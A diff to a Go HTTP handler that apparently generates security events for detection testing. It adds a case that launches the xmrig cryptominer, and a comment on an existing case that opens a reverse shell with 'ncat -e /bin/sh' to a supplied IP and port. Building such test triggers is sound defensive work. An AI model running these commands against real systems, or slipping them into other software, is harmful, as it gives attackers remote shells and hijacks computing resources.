@@ -245,7 +245,7 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 
 		defer listener.Close()
 
-		// connect to the listen after sleep_duration
+		// connect to the listener after sleep_duration
 		go func() {
 			time.Sleep(time.Duration(sleep_duration) * time.Second)
 
@@ -310,6 +310,21 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 			fmt.Fprintf(w, "%s\n", err)
 		}
 
+	case "mine":
+		// run xmrig command to trigger crypto mining event
+		ctx_duration := 5 * time.Second
+
+		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
+		defer cancel()
+
+		cmd_out, err := exec.CommandContext(ctx, "xmrig").Output()
+		fmt.Fprintf(w, "Running command \"xmrig\"\n")
+		if err == nil {
+			fmt.Fprintf(w, "%s\n", cmd_out)
+		} else {
+			fmt.Fprintf(w, "%s\n", err)
+		}
+
 	case "reverse":
 		// initiate a reverse shell command to trigger reverse shell event
 		ctx_duration := 30 * time.Second
@@ -328,6 +343,7 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
 		defer cancel()
 
+		// run ncat to estabish a reverse shell
 		cmd_out, err := exec.CommandContext(ctx, "ncat", "-e /bin/sh", dest_ip, tcp_port).Output()
 		fmt.Fprintf(w, "Running command \"ncat -e /bin/sh %s %s\"\n", dest_ip, tcp_port)
 		if err == nil {
